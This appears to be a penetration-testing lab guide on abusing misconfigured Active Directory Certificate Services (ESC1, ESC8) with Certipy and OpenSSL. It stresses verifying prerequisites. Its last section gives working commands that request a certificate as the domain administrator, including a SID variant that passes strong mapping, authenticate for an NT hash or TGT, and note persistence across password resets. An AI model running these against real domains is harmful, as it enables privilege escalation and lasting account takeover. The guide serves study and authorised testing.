## Qualify the certificate finding before choosing a recipe

ESC1–ESC8 represent distinct ADCS misconfigurations rather than a single certificate-template bug: for example, **ESC1** requires a specific combination of enrollment rights, client-authentication EKU, and requester-supplied SAN/identity fields, whereas **ESC8** abuses NTLM relay to HTTP web enrollment. Treat each ESC label as a separate hypothesis and verify all prerequisites before requesting or relaying a certificate.

### Collect the complete configuration first

```bash
certipy -h
certipy find -u 'student@lab.htb' -p 'LAB_PASSWORD' -dc-ip 10.129.10.10 -stdout
certipy find -u 'student@lab.htb' -p 'LAB_PASSWORD' -dc-ip 10.129.10.10 -vulnerable -stdout
```

Record the installed Certipy version from its banner/help and the identity used. Keep full output as well as the filtered result. The DC used for directory discovery and the CA used for enrollment can be different hosts. Passwords in these examples are placeholders; command-line secrets may be exposed through history/process listings.

| Hypothesis | Evidence to establish |
| --- | --- |
| ESC1 template path | Published template, effective enrollment rights, authentication purpose, controllable identity fields, issuance requirements and the resulting account mapping |
| ESC8 web-enrollment path | Reachable endpoint, NTLM behavior, relay protections, a suitable authentication source and enrollment rights for that identity |
| Writable template/CA object | Exact writable property, effective identity and how the change would affect issuance/authentication |
| Issued certificate | Matching private key, validity, intended identity and an accepting authentication service |

A finding reported by a tool is a lead. Save the underlying settings and evaluate the specific environment before applying an older lab procedure. Certificate issuance and successful authentication are separate events.

### Inspect a certificate without exporting its private key

```bash
openssl pkcs12 -in lab-certificate.pfx -clcerts -nokeys -out lab-certificate.pem
openssl x509 -in lab-certificate.pem -noout -subject -issuer -dates -text
```

Inspect identity fields, usages, issuer and validity. A certificate file without the matching private key is not an equivalent authentication credential. Strong-mapping requirements, account state, trust and KDC support can change whether a saved lab recipe succeeds.

### Classify the response before changing the hypothesis

| Result | Next check |
| --- | --- |
| Cannot reach or resolve the CA | Fix the CA endpoint path; do not change template hypotheses yet |
| Request denied | Inspect issuance requirements and the requesting identity's enrollment rights |
| Request pending | Record the request state; do not describe it as an issued certificate |
| Certificate issued, authentication fails | Inspect mapping, identity, key, time, trust and accepting service |

Keep the request outcome and authentication outcome in separate notebook fields. The existing [certificate walkthrough](/password-attacks/pass-the-certificate) remains a worked example to compare against these conditions.

### Establish a normal enrollment baseline

```bash
certipy req -u 'USERNAME@DOMAIN_FQDN' -p 'PASSWORD' \
  -ca CA_NAME -template TEMPLATE_NAME -dc-ip DC_IP
```

Use the observed CA/template values and inspect the request result. An issued certificate, a pending request and a denied request are different states. If the CA hostname cannot be resolved or reached, repair that path before changing template hypotheses.

### Authenticate only with the identity the certificate supports

```bash
certipy auth -pfx lab-certificate.pfx -dc-ip DC_IP
klist
```

Inspect the actual tool output and resulting cache location. Certificate mapping, account state, KDC certificate/PKINIT support, time and trust can all affect authentication. On patched Domain Controllers enforcing strong certificate mapping (`StrongCertificateBindingEnforcement` / KB5014754), include `-sid <TARGET_USER_SID>` when requesting an ESC1 certificate so the `szOID_NTDS_CA_SECURITY_EXT` SID extension matches the target account.

### Quick ESC1 & ESC8 worked syntax

Enumerate ADCS CAs and vulnerable templates from Kali with Certipy:

```bash
# find vulnerable templates
certipy find -u USER@$DOMAIN -p PASS -dc-ip $DC -vulnerable -stdout
```

## ESC1 — template allows SAN + client auth

```bash
# request a cert AS the domain admin (add -sid S-1-5-21-...-500 when strong certificate mapping is enforced)
certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -dc-ip $DC
# strong-mapping variant with target SID:
certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -sid S-1-5-21-DOMAIN-500 -dc-ip $DC
# authenticate with the cert -> get NT hash / TGT
certipy auth -pfx administrator.pfx -dc-ip $DC
```

> ESC8 = NTLM relay to the CA's web enrollment (`certipy relay`). Certificates survive password resets, making them a durable foothold.
